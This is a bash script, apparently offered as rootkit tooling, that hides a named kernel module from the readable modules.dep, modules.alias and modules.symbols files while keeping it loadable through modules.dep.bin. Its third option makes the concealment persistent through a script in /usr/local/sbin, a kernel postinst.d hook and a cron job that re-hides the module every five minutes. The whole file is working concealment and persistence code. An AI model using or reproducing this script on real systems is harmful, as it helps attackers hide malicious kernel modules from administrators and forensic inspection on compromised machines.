#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Depmod Stealth — Hide Module from modules.dep [*] "
echo ""
echo "This removes the rootkit entry from the human-readable modules.dep"
echo "while preserving it in modules.dep.bin (the binary trie that modprobe"
echo "actually reads). This hides the module from casual inspection."
echo ""

KVER=$(uname -r)
MODDIR="/lib/modules/$KVER"
MODDEP="$MODDIR/modules.dep"
MODDEPBIN="$MODDIR/modules.dep.bin"

if [ ! -f "$MODDEP" ]; then
    echo "[ERROR] modules.dep not found at $MODDEP" >&2
    exit 1
fi

echo "Select operation:"
echo "  [1] Hide a module from modules.dep (keep in modules.dep.bin)"
echo "  [2] List all currently registered modules in modules.dep"
echo "  [3] Protect modules.dep.bin from depmod rebuild (install hook)"
read -p "Choice [1-3]: " choice

case "$choice" in
    1)
        read -p "Enter the module name to hide (without .ko): " modname

        # Check if module exists in modules.dep
        if ! grep -q "/${modname}\.ko" "$MODDEP" 2>/dev/null; then
            echo "[WARNING] Module '$modname' not found in modules.dep"
            echo "Available modules matching pattern:"
            grep -o "[^/]*${modname}[^:]*" "$MODDEP" 2>/dev/null | head -5
            exit 1
        fi

        # Backup modules.dep.bin before modification (this is what modprobe reads)
        cp "$MODDEPBIN" "${MODDEPBIN}.bak" 2>/dev/null

        # Remove the module entry from the human-readable modules.dep
        echo "[+] Removing '$modname' from modules.dep..."
        sed -i "\|/${modname}\.ko|d" "$MODDEP"

        # Also remove from modules.alias (human-readable)
        if [ -f "$MODDIR/modules.alias" ]; then
            sed -i "/ ${modname}$/d" "$MODDIR/modules.alias" 2>/dev/null
        fi

        # Also remove from modules.symbols
        if [ -f "$MODDIR/modules.symbols" ]; then
            sed -i "/ ${modname}$/d" "$MODDIR/modules.symbols" 2>/dev/null
        fi

        echo "[+] Module '$modname' removed from human-readable dep files."
        echo "[+] modules.dep.bin still contains the entry — modprobe will still work."
        echo ""
        echo "[!] WARNING: Running 'depmod -a' will rebuild all files and undo this."
        echo "    Use option [3] to install a protection hook."
        ;;
    2)
        echo "[*] Modules in modules.dep:"
        echo ""
        awk -F: '{print $1}' "$MODDEP" | sed 's|.*/||; s|\.ko.*||' | sort
        ;;
    3)
        read -p "Enter the module name to protect: " modname

        # Create a hook that re-hides the module after depmod runs
        echo "[+] Installing depmod post-hook..."

        # Method: wrap depmod with an alias that cleans up after itself
        HOOK_SCRIPT="/usr/local/sbin/depmod-stealth-${modname}"
        cat > "$HOOK_SCRIPT" <<HOOKEOF
#!/bin/bash
# Post-depmod stealth hook for $modname
# Removes module from human-readable files after depmod rebuilds them
KVER=\$(uname -r)
MODDEP="/lib/modules/\$KVER/modules.dep"
MODALIAS="/lib/modules/\$KVER/modules.alias"
MODSYM="/lib/modules/\$KVER/modules.symbols"

sed -i "\|/${modname}\.ko|d" "\$MODDEP" 2>/dev/null
sed -i "/ ${modname}\$/d" "\$MODALIAS" 2>/dev/null
sed -i "/ ${modname}\$/d" "\$MODSYM" 2>/dev/null
HOOKEOF
        chmod +x "$HOOK_SCRIPT"

        # Install as a kernel postinst hook (depmod runs during kernel installs)
        mkdir -p /etc/kernel/postinst.d/
        cat > /etc/kernel/postinst.d/zz-stealth-${modname} <<POSTHOOKEOF
#!/bin/bash
# Re-hide module after kernel update triggers depmod
$HOOK_SCRIPT
POSTHOOKEOF
        chmod +x /etc/kernel/postinst.d/zz-stealth-${modname}

        # Also create a cron job to periodically re-hide
        CRONFILE="/etc/cron.d/stealth-${modname}"
        echo "*/5 * * * * root $HOOK_SCRIPT >/dev/null 2>&1" > "$CRONFILE"
        chmod 644 "$CRONFILE"

        echo "[+] Protection hook installed:"
        echo "    Script:    $HOOK_SCRIPT"
        echo "    Postinst:  /etc/kernel/postinst.d/zz-stealth-${modname}"
        echo "    Cron:      $CRONFILE (every 5 minutes)"
        echo "[*] Module '$modname' will be re-hidden after any depmod execution."
        ;;
    *)
        echo "[ERROR] Invalid choice" >&2
        exit 1
        ;;
esac

sleep 1

clear
